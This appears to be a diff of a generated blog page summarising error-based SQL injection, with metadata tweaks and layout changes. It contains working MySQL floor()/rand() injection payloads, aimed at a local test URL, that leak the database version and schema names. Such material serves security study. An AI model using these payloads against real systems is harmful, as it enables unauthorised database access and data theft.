@@ -81,18 +81,18 @@
 
 
 
-<meta name="description" content="1 floor() Example Show Version() http://0.0.0.0:8001/test.php?name=aa&apos;and (select 1 from  (select count(*),concat(version(),floor(rand(0)*2))x from  information_schema.tables group by x)a)%23&amp;pass=1 S">
+<meta name="description" content="1 floor() Example Show Version() http://0.0.0.0:8001/test.php?name=aa&apos;and (select 1 from  (select count(*),concat(version(),floor(rand(0)*2))x from  information_schema.tables group by x)a)%23&amp;pass=1">
 <meta name="keywords" content="SQL injection">
 <meta property="og:type" content="article">
 <meta property="og:title" content="报错注入总结">
 <meta property="og:url" content="http://yoursite.com/2018/04/17/Error-Based-SQL Injection/index.html">
 <meta property="og:site_name" content="AirBoi">
-<meta property="og:description" content="1 floor() Example Show Version() http://0.0.0.0:8001/test.php?name=aa&apos;and (select 1 from  (select count(*),concat(version(),floor(rand(0)*2))x from  information_schema.tables group by x)a)%23&amp;pass=1 S">
+<meta property="og:description" content="1 floor() Example Show Version() http://0.0.0.0:8001/test.php?name=aa&apos;and (select 1 from  (select count(*),concat(version(),floor(rand(0)*2))x from  information_schema.tables group by x)a)%23&amp;pass=1">
 <meta property="og:locale" content="default">
-<meta property="og:updated_time" content="2018-04-17T03:15:36.351Z">
+<meta property="og:updated_time" content="2018-04-17T03:21:36.004Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="报错注入总结">
-<meta name="twitter:description" content="1 floor() Example Show Version() http://0.0.0.0:8001/test.php?name=aa&apos;and (select 1 from  (select count(*),concat(version(),floor(rand(0)*2))x from  information_schema.tables group by x)a)%23&amp;pass=1 S">
+<meta name="twitter:description" content="1 floor() Example Show Version() http://0.0.0.0:8001/test.php?name=aa&apos;and (select 1 from  (select count(*),concat(version(),floor(rand(0)*2))x from  information_schema.tables group by x)a)%23&amp;pass=1">
 
 
 
@@ -332,12 +332,14 @@
       
 
       
-        <h2 id="1-floor"><a href="#1-floor" class="headerlink" title="1 floor()"></a>1 floor()</h2><hr>
+        <hr>
+<h2 id="1-floor"><a href="#1-floor" class="headerlink" title="1 floor()"></a>1 floor()</h2><hr>
 <p>Example</p>
 <p>Show Version()</p>
 <pre><code class="SQL">http://0.0.0.0:8001/test.php?name=aa'and (select 1 from  (select count(*),concat(version(),floor(rand(0)*2))x from  information_schema.tables group by x)a)%23&pass=1</code></pre>
 Show Databases
-
+---
+<a id="more"></a>
 <pre><code class="SQL">http://0.0.0.0:8001/test.php?name=aa' AND (SELECT 3904 FROM(SELECT COUNT(*),CONCAT(0x7e,(SELECT schema_name FROM INFORMATION_SCHEMA.SCHEMATA LIMIT 0,1),0x7e,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)%23&pass=1</code></pre>
 Show Tables
 
